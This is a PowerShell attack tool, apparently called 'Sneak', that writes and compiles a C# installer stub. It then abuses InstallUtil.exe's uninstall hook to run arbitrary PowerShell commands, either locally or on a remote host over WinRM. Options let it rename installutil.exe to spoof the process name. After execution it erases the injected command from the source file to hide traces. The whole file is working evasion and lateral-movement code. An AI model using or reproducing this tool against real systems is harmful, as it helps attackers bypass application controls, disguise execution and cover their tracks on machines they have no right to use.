﻿ write-host "
   ____                            |  /   
 |      |\    |  _____     /\      | /
 |      | \   | |         /  \     |/
 |____  |  \  | |_____   /    \    |\
      | |   \ | |       /______\   | \
 _____| |    \| |_____ /        \  |  \
"
Write-Host "The WINRM Function Sneaking Script" -ForegroundColor White
write-host "
sneak [-filepath] [-options]

options
-remotemachine     name of remote machine to sneak(Used with RunRemote)
-testconnection    tests remote box for connectivity
-functioncommand   command from function to run on local box or remote box
-localhostran      run sneak withing the localhost
-Spoofname         Process you want to spoof as(run with spoof switch)
-Credential        User you want to run the command as
-RunRemote         Runs the commands remotely
-Spoof             Spoofs the process as the chosen Spoofname" -ForegroundColor Yellow


function Sneak{
[CmdletBinding(DefaultParameterSetName="Local")]

param(
[parameter(mandatory=$true, position=0,ParameterSetname="Local")]
[parameter(ParameterSetname="Remote")]
[validatenotnull()] [string]$filepath,
[parameter(ParameterSetname="Remote")]
[validatenotnull()]
[string]$remotemachine,
[parameter(ParameterSetname="Remote")]
[switch]$testconnection,
[parameter()]
[validatenotnull()]
[string]$Functioncommand,
[parameter(ParameterSetname="Local")]
[switch]$LocalHostRan,
[parameter(ParameterSetname="Remote")]
[switch]$RunRemote,
[parameter(ParameterSetname="Remote")]
[validatenotnull()] [string]$Credential,
[parameter(ParameterSetname="Local")]
[parameter(ParameterSetname="Remote")]
[validatenotnull()] [string]$Spoofname,
[parameter(ParameterSetname="Remote")]
[parameter(ParameterSetname="Local")]
[switch]$Spoof
)
$realpath="C:\Windows\Microsoft.NET\Framework64\v2.0.50727\"
$pathcheck1=Test-Path "$realpath\csc.exe"
$pathcheck2=Test-Path "$realpath\installutil.exe"
if($pathcheck1 -and $pathcheck2){
Write-Host "You have the files necessary to go on" -ForegroundColor Green
}#End If
else{
Write-Host "Sorry you don't have the necessary files to do this operarion" -ForegroundColor Red
break;
}
Import-Module -Name $filepath
if($testconnection){
if(Test-Connection -ComputerName $remotemachine -Count 4){
write-host "Connection good" -ForegroundColor Green}
else{
Write-Host "Cannot connect to host" -ForegroundColor Red
return}
                    }#End Testconnection


if($RunRemote){
$Creds=Get-Credential -Credential $Credential
$session=New-PSSession -ComputerName $remotemachine -Credential $Creds
$sessiontest=""
$sessiontest=(Get-PSSession *).Id
if($sessiontest -eq "$null"){
Write-Host "You ain't got a session set up" -ForegroundColor Red
break
}#End IF
else{
Write-Host "You have a session open"
} #End Else

#This is where it starts to create the C script and executable for the execution of the function
$itempath="C:\Users\$env:username\Desktop\standardfile.cs"
New-Item -Path "C:\Users\$env:username\Desktop\standardfile.cs" -ItemType file -Value "using System;
 using System.Configuration.Install;
 using System.Runtime.InteropServices;
 using System.Management.Automation.Runspaces;
 public class Program
 {
 public static void Main()
 {
 }
 }
 [System.ComponentModel.RunInstaller(true)]
 public class Sample : System.Configuration.Install.Installer
 {
 public override void Uninstall(System.Collections.IDictionary savedState)
 {
 Mycode.Exec();
 }
 }
 public class Mycode
 {
 public static void Exec()
 {
 string command = System.IO.File.ReadAllText(@`"$filepath`");
 RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
 Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
 rspace.Open();
 Pipeline pipeline = rspace.CreatePipeline();
 pipeline.Commands.AddScript(command);
 pipeline.Invoke();
 }
 }
 "

Add-Content -Value $Functioncommand -Path $filepath;

cd $realpath
$command="cmd.exe /C csc.exe/r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:`"C:\Users\$env:username\Desktop\standardfile.exe`" `"$itempath`""
Invoke-Expression -Command $command

if($Spoof){
$SpoofContent=Get-Content -Path "$realpath\installutil.exe" -Encoding Byte
[System.IO.File]::WriteAllBytes("C:\$env:username\desktop\$Spoofname",$SpoofContent)
$command2="cmd.exe /C InstallUtil.exe/logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\$env:username\desktop\$Spoofname`" "
Invoke-Command -Session $session {Invoke-Expression -Command $using:command2}
$removalstuff=Get-Content -Path $filepath | Out-String
$removalstuff=$removalstuff.Replace("$Functioncommand","")
Clear-Content -Path $filepath
Add-Content -Path $filepath -Value $removalstuff
}#End Spoof

else{
$command2="cmd.exe /C InstallUtil.exe/logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\Users\$env:username\Desktop\standardfile.exe`" "
Invoke-Command -Session $session {Invoke-Expression -Command $using:command2}
$removalstuff=Get-Content -Path $filepath | Out-String
$removalstuff=$removalstuff.Replace("$Functioncommand","")
Clear-Content -Path $filepath
Add-Content -Path $filepath -Value $removalstuff
}#EndElse
}#End RunRemote


if($LocalHostRan){
$itempath="C:\Users\$env:username\Desktop\standardfile.cs"
New-Item -Path "C:\Users\$env:username\Desktop\standardfile.cs" -ItemType File -Value "using System;
 using System.Configuration.Install;
 using System.Runtime.InteropServices;
 using System.Management.Automation.Runspaces;
 public class Program
 {
 public static void Main()
 {
 }
 }
 [System.ComponentModel.RunInstaller(true)]
 public class Sample : System.Configuration.Install.Installer
 {
 public override void Uninstall(System.Collections.IDictionary savedState)
 {
 Mycode.Exec();
 }
 }
 public class Mycode
 {
 public static void Exec()
 {
 string command = System.IO.File.ReadAllText(@`"$filepath`");
 RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
 Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
 rspace.Open();
 Pipeline pipeline = rspace.CreatePipeline();
 pipeline.Commands.AddScript(command);
 pipeline.Invoke();
 }
 }
 "

Add-Content -Value $Functioncommand -Path $filepath;

cd $realpath
$command="cmd.exe /C csc.exe/r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:`"C:\Users\$env:username\Desktop\standardfile.exe`" `"$itempath`""
Invoke-Expression -Command $command

if($Spoof){
$SpoofContent=Get-Content -Path "$realpath\installutil.exe" -Encoding Byte
[System.IO.File]::WriteAllBytes("C:\$env:username\desktop\$Spoofname",$SpoofContent)
$command2="cmd.exe /C InstallUtil.exe/logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\$env:username\desktop\$Spoofname`" "
Invoke-Expression -Command $command2
$removalstuff=Get-Content -Path $filepath | Out-String
$removalstuff=$removalstuff.Replace("$Functioncommand","")
Clear-Content -Path $filepath
Add-Content -Path $filepath -Value $removalstuff
}#End Spoof

else{
$command2="cmd.exe /C InstallUtil.exe/logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\Users\$env:username\Desktop\standardfile.exe`" "
Invoke-Expression -Command $command2
$removalstuff=Get-Content -Path $filepath | Out-String
$removalstuff=$removalstuff.Replace("$Functioncommand","")
Clear-Content -Path $filepath
Add-Content -Path $filepath -Value $removalstuff
} #End else
}#End LocalHostRan
}#End Sneak
